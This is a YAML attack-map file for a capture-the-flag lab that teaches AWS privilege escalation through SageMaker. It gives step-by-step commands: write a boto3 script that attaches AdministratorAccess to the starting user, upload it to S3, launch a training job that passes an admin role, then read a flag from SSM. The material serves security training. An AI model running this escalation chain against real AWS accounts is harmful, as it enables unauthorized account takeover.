attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-sagemaker-002-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole on the admin passable role, sagemaker:CreateTrainingJob,
        and s3:PutObject on the training bucket — a combination that enables privilege
        escalation via a malicious SageMaker training script.

    - id: training-bucket
      label: "Training Script Bucket"
      type: resource
      subType: s3-bucket
      arn: "arn:aws:s3:::pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}"
      description: >
        S3 bucket used to store the SageMaker training script. By uploading a malicious
        Python script here, an attacker can control what code runs inside the training job.

    - id: training-job
      label: "SageMaker Training Job"
      type: resource
      subType: sagemaker-notebook
      arn: "arn:aws:sagemaker:{region}:{account_id}:training-job/pl-prod-sagemaker-002-to-admin-training-job"
      description: >
        SageMaker training job created by the attacker. It runs with the credentials of the
        passable admin role, executes the malicious training script downloaded from S3, and
        grants administrative access to the starting user.

    - id: target-role
      label: "Admin Passable Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-sagemaker-002-to-admin-passable-role"
      description: >
        Administrative IAM role that trusts the SageMaker service principal. By passing this
        role to the training job, the attacker's script executes with full administrative
        credentials, completing the privilege escalation. Admin-equivalent permissions are
        then used to read the scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/sagemaker-002-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-principal
      to: training-bucket
      label: "s3:PutObject"
      description: >
        Upload a malicious Python training script to the S3 bucket. The script will use the
        training job's execution role credentials to grant admin access to the starting user.
      hints:
        - "Write a Python script that uses boto3 to attach AdministratorAccess to your user, then package it as a tar.gz archive and upload it to the staging bucket. SageMaker training jobs download and execute the archive at runtime with the execution role's credentials."
      commands:
        - description: "Create a malicious training script that attaches admin policy to the starting user"
          command: |
            cat > /tmp/exploit.py << 'EOF'
            import boto3
            iam = boto3.client('iam')
            iam.attach_user_policy(
                UserName='pl-prod-sagemaker-002-to-admin-starting-user',
                PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
            )
            EOF
        - description: "Package the script as a tar.gz archive for SageMaker"
          command: "cd /tmp && tar -czf sourcedir.tar.gz exploit.py && cd -"
        - description: "Upload the packaged script to the training bucket"
          command: "aws s3 cp /tmp/sourcedir.tar.gz s3://pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}/sourcedir.tar.gz"

    - from: training-bucket
      to: training-job
      label: "iam:PassRole + sagemaker:CreateTrainingJob"
      description: >
        Create a SageMaker training job that passes the admin role and references the malicious
        script in S3. SageMaker downloads the script and executes it with the admin role's credentials.
      hints:
        - "When creating the training job, specify the packaged script via the sagemaker_submit_directory hyperparameter and the entry point via sagemaker_program. Use a SageMaker-compatible container image such as the pytorch-training image from ECR account 763104351884 in your region."
        - "The training container takes 3-5 minutes to provision before your script executes -- poll sagemaker:DescribeTrainingJob until status reaches Completed."
        - "Browse to https://pathfinding.cloud/paths/sagemaker-002 for technique details."
      commands:
        - description: "Create the SageMaker training job with the admin passable role"
          command: |
            aws sagemaker create-training-job \
              --training-job-name pl-demo-training-$(date +%s) \
              --role-arn arn:aws:iam::{account_id}:role/pl-prod-sagemaker-002-to-admin-passable-role \
              --algorithm-specification '{"TrainingImage": "763104351884.dkr.ecr.{region}.amazonaws.com/pytorch-training:2.0.0-cpu-py310", "TrainingInputMode": "File"}' \
              --input-data-config '[{"ChannelName": "training", "DataSource": {"S3DataSource": {"S3DataType": "S3Prefix", "S3Uri": "s3://pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}", "S3DataDistributionType": "FullyReplicated"}}}]' \
              --output-data-config '{"S3OutputPath": "s3://pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}/output"}' \
              --resource-config '{"InstanceType": "ml.m5.large", "InstanceCount": 1, "VolumeSizeInGB": 10}' \
              --stopping-condition '{"MaxRuntimeInSeconds": 600}' \
              --hyper-parameters '{"sagemaker_program": "exploit.py", "sagemaker_submit_directory": "s3://pl-prod-sagemaker-002-to-admin-bucket-{account_id}-{suffix}/sourcedir.tar.gz"}'

    - from: training-job
      to: target-role
      label: "Executes as admin role"
      description: >
        The training job runs the malicious script with the admin role's temporary credentials,
        attaching AdministratorAccess to the starting user and completing the privilege escalation.
      hints:
        - "Once the job completes, wait 15 seconds for IAM policy propagation before verifying the escalation worked."
      commands:
        - description: "Wait for training job to complete"
          command: "aws sagemaker describe-training-job --training-job-name <job-name> --query 'TrainingJobStatus' --output text"
        - description: "Verify admin access was granted to the starting user"
          command: "aws iam list-attached-user-policies --user-name pl-prod-sagemaker-002-to-admin-starting-user"
        - description: "Confirm administrator access with a privileged API call"
          command: "aws iam list-users --max-items 3 --output table"

    - from: target-role
      to: ctf-flag
      label: "ssm:GetParameter"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/sagemaker-002-to-admin --query 'Parameter.Value' --output text"
